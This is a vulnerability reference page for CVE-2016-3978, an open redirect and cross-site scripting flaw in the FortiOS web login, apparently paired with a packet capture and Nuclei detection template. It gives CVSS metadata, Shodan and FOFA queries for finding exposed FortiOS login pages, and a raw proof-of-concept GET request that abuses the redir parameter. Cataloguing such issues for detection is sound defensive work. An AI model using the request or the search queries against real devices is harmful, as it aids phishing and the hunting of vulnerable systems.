---
layout: post
cve_id: CVE-2016-3978
title: Fortinet FortiOS - Open Redirect/Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2016/CVE-2016-3978.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2016/CVE-2016-3978.yaml
snort2_rule: N/A
snort3_rule: N/A
author: 0x_Akoko
severity: medium
impact: 'Successful exploitation of this vulnerability could lead to unauthorized
  access, phishing attacks, and potential data theft.

  '
remediation: 'Apply the latest security patches and updates provided by Fortinet to
  mitigate the vulnerability.

  '
reference:
- http://www.fortiguard.com/advisory/fortios-open-redirect-vulnerability
- https://nvd.nist.gov/vuln/detail/CVE-2016-3978
- http://seclists.org/fulldisclosure/2016/Mar/68
- http://www.securitytracker.com/id/1035332
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2016-3978
  cwe-id: CWE-79
  epss-score: 0.05549
  epss-percentile: 0.89987
  cpe: cpe:2.3:o:fortinet:fortios:5.0.0:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: fortinet
  product: fortios
  shodan-query:
  - http.html:"/remote/login" "xxxxxxxx"
  - http.favicon.hash:945408572
  - cpe:"cpe:2.3:o:fortinet:fortios"
  - port:10443 http.favicon.hash:945408572
  fofa-query:
  - body="/remote/login" "xxxxxxxx"
  - icon_hash=945408572
tags:
- cve2016
- cve
- redirect
- fortinet
- fortios
- seclists
- vuln
---

## üîç Vulnerability Description
FortiOS Web User Interface in 5.0.x before 5.0.13, 5.2.x before 5.2.3, and 5.4.x before 5.4.0 allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks or cross-site scripting attacks via the "redirect" parameter to "login."

## üåê HTTP Request
```nohighlight
GET /login?redir=http://www.interact.sh HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.5.20
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

